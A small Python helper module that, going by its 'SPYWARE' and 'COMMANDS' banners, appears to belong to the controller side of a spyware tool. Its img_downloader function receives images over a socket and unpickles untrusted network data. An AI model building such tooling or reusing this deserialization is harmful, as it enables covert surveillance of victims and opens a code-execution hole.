import os
import random
import pickle
import cv2


def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")


def press_enter():
    input(' Press ENTER to continue > ')


def invalid_inp():
    print("\n ERROR: invalid input")
    input(" ENTER to try again > ")


def random_name():
    chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    name = ''

    for _ in range(7):
        name += random.choice(chars)
    return name


def img_downloader(conn):
    buffer = 1024
    size = int(conn.recv(1024).decode('utf-8'))
    received_size = 0
    data = b''
    conn.send('ok'.encode('utf-8'))

    while size - received_size:
        received_data = conn.recv(buffer)
        received_size += len(received_data)
        data += received_data

    image = pickle.loads(data)
    cv2.imwrite('image.png', image)



ascii_logo = r"""
 ______     ______   __  __     __     __     ______     ______     ______    
/\  ___\   /\  == \ /\ \_\ \   /\ \  _ \ \   /\  __ \   /\  == \   /\  ___\   
\ \___  \  \ \  _-/ \ \____ \  \ \ \/ ".\ \  \ \  __ \  \ \  __<   \ \  __\   
 \/\_____\  \ \_\    \/\_____\  \ \__/".~\_\  \ \_\ \_\  \ \_\ \_\  \ \_____\ 
  \/_____/   \/_/     \/_____/   \/_/   \/_/   \/_/\/_/   \/_/ /_/   \/_____/ 
                                                                                                                                                                      
"""

ascii_cmd = r"""
 ______     ______     __    __     __    __     ______     __   __     _____     ______    
/\  ___\   /\  __ \   /\ "-./  \   /\ "-./  \   /\  __ \   /\ "-.\ \   /\  __-.  /\  ___\   
\ \ \____  \ \ \/\ \  \ \ \-./\ \  \ \ \-./\ \  \ \  __ \  \ \ \-.  \  \ \ \/\ \ \ \___  \  
 \ \_____\  \ \_____\  \ \_\ \ \_\  \ \_\ \ \_\  \ \_\ \_\  \ \_\\"\_\  \ \____-  \/\_____\ 
  \/_____/   \/_____/   \/_/  \/_/   \/_/  \/_/   \/_/\/_/   \/_/ \/_/   \/____/   \/_____/                                                                                      
"""